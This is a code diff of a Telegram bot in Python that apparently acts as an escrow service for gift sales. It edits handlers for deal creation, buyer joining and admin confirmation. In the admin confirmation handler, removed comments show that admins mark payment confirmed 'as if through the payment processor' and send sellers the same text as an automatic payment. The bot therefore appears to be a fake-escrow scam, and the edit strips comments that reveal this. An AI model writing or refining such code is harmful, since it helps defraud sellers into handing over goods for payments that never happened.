@@ -48,14 +48,12 @@ async def send_main_menu(message_or_call, user_id: int, edit: bool = False):
     kb = main_menu_kb(lang, is_admin)
     
     if edit and hasattr(message_or_call, "edit_text"):
-        # Это CallbackQuery - редактируем текущее сообщение
         await message_or_call.edit_text(text, reply_markup=kb)
     elif hasattr(message_or_call, "message"):
-        # Это CallbackQuery - отправляем новое сообщение
         await message_or_call.message.answer(text, reply_markup=kb)
     else:
-        # Это обычное Message
         await message_or_call.answer(text, reply_markup=kb)
+
 
 # ================= СТАРТ =================
 
@@ -65,7 +63,6 @@ async def cmd_start(message: Message, state: FSMContext, bot: Bot):
     user = await db.get_user(message.from_user.id)
     lang = user["language"]
 
-    # Deep-link: /start ALX123456
     args = message.text.split(" ", 1) if message.text else []
     if len(args) > 1 and args[1].startswith("ALX"):
         deal_number = args[1]
@@ -81,7 +78,6 @@ async def cmd_start(message: Message, state: FSMContext, bot: Bot):
             await message.answer(text, reply_markup=join_deal_kb(deal_number, lang))
             return
 
-    # Обычный /start - показываем меню один раз
     await send_main_menu(message, message.from_user.id)
 
 
@@ -143,7 +139,7 @@ async def process_amount(message: Message, state: FSMContext):
         await message.answer(t(lang, "enter_card"), reply_markup=back_cancel_kb(lang))
     elif currency == "STARS":
         await message.answer(t(lang, "enter_stars_username"), reply_markup=back_cancel_kb(lang))
-    else:  # USDT или TON
+    else:
         await message.answer(t(lang, "enter_crypto_wallet"), reply_markup=back_cancel_kb(lang))
 
     await state.set_state(CreateDeal.waiting_for_details)
@@ -198,7 +194,6 @@ async def buyer_join(call: CallbackQuery, bot: Bot):
 
     await db.join_deal(deal_number, call.from_user.id, username)
 
-    # Уведомление продавцу
     seller = await db.get_user(deal["seller_id"])
     seller_lang = seller["language"]
     await bot.send_message(
@@ -210,7 +205,6 @@ async def buyer_join(call: CallbackQuery, bot: Bot):
         )
     )
 
-    # Уведомление всем админам
     admins = await db.get_admins()
     for admin in admins:
         try:
@@ -255,7 +249,6 @@ async def set_lang(call: CallbackQuery):
     await db.update_user(call.from_user.id, language=lang)
     user = await db.get_user(call.from_user.id)
     is_admin = bool(user["is_admin"])
-
     await call.message.edit_text(
         t(lang, "language_changed"),
         reply_markup=back_kb(lang)
@@ -434,13 +427,11 @@ async def admin_confirm_deal(call: CallbackQuery, bot: Bot):
         await call.answer("✅ Сделка уже подтверждена или завершена", show_alert=True)
         return
 
-    # 🔑 Подтверждаем оплату (как будто она прошла через платёжку)
+    # Подтверждаем оплату
     await db.confirm_payment(deal_number)
-    
-    # Лог для внутреннего учёта (админы видят только "оплата подтверждена")
     print(f"[ADMIN] Ручное подтверждение сделки {deal_number} админом {call.from_user.id}")
 
-    # Уведомление продавцу — СТАНДАРТНЫЙ ТЕКСТ (как при авто-оплате)
+    # Уведомление продавцу
     try:
         await bot.send_message(
             deal["seller_id"],
@@ -451,7 +442,7 @@ async def admin_confirm_deal(call: CallbackQuery, bot: Bot):
     except Exception:
         pass
 
-    # Уведомление покупателю с кнопкой подтверждения
+    # Уведомление покупателю
     try:
         await bot.send_message(
             deal["buyer_id"],
@@ -465,7 +456,7 @@ async def admin_confirm_deal(call: CallbackQuery, bot: Bot):
     except Exception:
         pass
 
-    # Уведомление всем админам о ручном подтверждении
+    # Уведомление другим админам
     admins = await db.get_admins()
     for admin in admins:
         if admin["user_id"] != call.from_user.id:
@@ -479,25 +470,23 @@ async def admin_confirm_deal(call: CallbackQuery, bot: Bot):
                 pass
 
     await call.answer("✅ Оплата подтверждена вручную!")
-    
-    # Обновляем сообщение
-admin_lang = user["language"]
 
-await call.message.edit_text(
-    f"✅ Сделка #{deal_number} подтверждена!\n\n"
-    f"👤 Продавец: @{deal['seller_username']}\n"
-    f"🛒 Покупатель: @{deal['buyer_username']}\n"
-    f"🎁 Подарок: {deal['gift_link']}\n\n"
-    f"📨 Уведомления отправлены обеим сторонам.",
-    reply_markup=back_kb(admin_lang)
-)
+    # ВАЖНО: эти строки ВНУТРИ функции (с отступом 4 пробела!)
+    admin_lang = user["language"]
+    await call.message.edit_text(
+        f"✅ Сделка #{deal_number} подтверждена!\n\n"
+        f"👤 Продавец: @{deal['seller_username']}\n"
+        f"🛒 Покупатель: @{deal['buyer_username']}\n"
+        f"🎁 Подарок: {deal['gift_link']}\n\n"
+        f"📨 Уведомления отправлены обеим сторонам.",
+        reply_markup=back_kb(admin_lang)
+    )
 
 
 # ================= ПОКУПАТЕЛЬ ПОДТВЕРЖДАЕТ ПОЛУЧЕНИЕ =================
 
 @router.callback_query(F.data == "confirm_gift")
 async def buyer_confirms_gift(call: CallbackQuery, bot: Bot):
-    # Ищем активную оплаченную сделку, где этот юзер — покупатель
     import aiosqlite
     async with aiosqlite.connect(db.DB_PATH) as conn:
         conn.row_factory = aiosqlite.Row
@@ -513,7 +502,6 @@ async def buyer_confirms_gift(call: CallbackQuery, bot: Bot):
 
     await db.complete_deal(deal["deal_number"])
 
-    # Уведомление продавцу
     try:
         await bot.send_message(
             deal["seller_id"],
@@ -617,9 +605,9 @@ async def cancel_handler(call: CallbackQuery, state: FSMContext):
     await call.message.edit_text(t(lang, "cancelled"), reply_markup=back_kb(lang))
     await call.answer()
 
+
 @router.message()
 async def unknown_message(message: Message):
-    """Обработчик для неизвестных сообщений."""
     user = await db.get_user(message.from_user.id)
     lang = user["language"]
     await message.answer(
@@ -627,29 +615,30 @@ async def unknown_message(message: Message):
         reply_markup=main_menu_kb(lang, bool(user["is_admin"]))
     )
 
+
 @router.callback_query(F.data.startswith("deal_info:"))
 async def deal_info(call: CallbackQuery):
     user = await db.get_user(call.from_user.id)
     if not user["is_admin"]:
         await call.answer("🚫 Доступ запрещён", show_alert=True)
         return
-    
+
     deal_number = call.data.split(":", 1)[1]
     deal = await db.get_deal_by_number(deal_number)
-    
+
     if not deal:
         await call.answer("❌ Сделка не найдена", show_alert=True)
         return
-    
+
     status_map = {
         "waiting_for_buyer": "🟡 Ожидает покупателя",
         "buyer_joined": "🔵 Покупатель присоединился",
         "paid": "✅ Оплачена",
         "completed": "🏁 Завершена"
     }
-    
+
     text = (
-        f"📋 **Информация о сделке #{deal_number}**\n\n"
+        f"📋 Информация о сделке #{deal_number}\n\n"
         f"🎁 Подарок: {deal['gift_link']}\n"
         f"💰 Сумма: {deal['amount']} {deal['currency']}\n"
         f"💳 Реквизиты: {deal['payment_details']}\n\n"
@@ -658,8 +647,7 @@ async def deal_info(call: CallbackQuery):
         f"📊 Статус: {status_map.get(deal['status'], deal['status'])}\n"
         f"📅 Создана: {deal['created_at'][:19]}"
     )
-    
-    # Кнопки
+
     kb = []
     if deal["buyer_id"] and deal["status"] not in ["paid", "completed"]:
         kb.append([InlineKeyboardButton(
@@ -667,6 +655,6 @@ async def deal_info(call: CallbackQuery):
             callback_data=f"confirm_deal:{deal_number}"
         )])
     kb.append([InlineKeyboardButton(text="◀️ К списку сделок", callback_data="admin_deals")])
-    
+
     await call.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=kb))
     await call.answer()
